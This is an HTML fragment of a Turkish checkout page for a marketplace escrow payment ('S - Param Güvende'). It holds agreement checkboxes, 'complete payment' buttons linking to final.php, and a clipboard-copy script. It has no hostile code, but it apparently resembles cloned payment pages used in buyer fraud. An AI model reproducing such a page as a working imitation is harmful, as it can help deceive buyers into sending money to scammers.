                        <span class="sum-label"></span>
                      </span>
                      <p class="left total">Toplam</p>
                    </div>
                  </div>
                  <div class="sub-right-box cargo-info">
                    <p> Satıcı&nbsp;3&nbsp;iş günü içinde kargolar.</p>
                  </div>
				  <div class="sub-right-box agreement">
                      <div class="agreement-box financial">
                        <input class="mss sg-checkbox" type="checkbox" name="mss" id="mss" autocomplete="off">
                        <label for="mss">Ürün <a href="#" id="mssPopupLink" class="mssPopupLink">Satış Sözleşmesi</a> ve <br class="only-for-web">S - Param Güvende Hizmet Sözleşmesini kabul ediyorum. </label>
                        <span class="errorLabel">Lütfen onaylayın.</span>
                      </div>
                      <div class="agreement-box mss-inputs marketplace">
                        <input type="checkbox" name="frameAgreement" id="frameAgreement" class="frame-agreement sg-checkbox" autocomplete="off">
                        <label for="frameAgreement">
                          <a href="#" id="marketPlaceProviderAgreementLink" class="marketPlaceProviderAgreementLink">Ödeme Kuruluşu Çerçeve Sözleşme koşulları</a>nı kabul ediyorum. 
                        </label>
                        <span class="errorLabel">Lütfen onaylayın.</span>
                      </div>
                    </div>
                  <a href="final.php" class="btn btn-new go-to-address-btn responsiveBtn">Ödemeyi tamamla</a>
                </div>
                <div class="responsive-part go-to-address-btn-wrapper">
                  <a href="final.php" class="btn btn-new go-to-address-btn responsiveBtn">Ödemeyi tamamla</a>
                          
    <script>
	function kopyala(elemanID){
  var cop = document.createElement("div");
  cop.setAttribute("contentEditable", true);
  cop.innerHTML = document.getElementById(elemanID).innerHTML;
  cop.setAttribute("onfocus", "document.execCommand('selectAll',false,null)"); 
  document.body.appendChild(cop);
  cop.focus();
  document.execCommand("copy");
  document.body.removeChild(cop);
}
    </script>

  </body>
</html>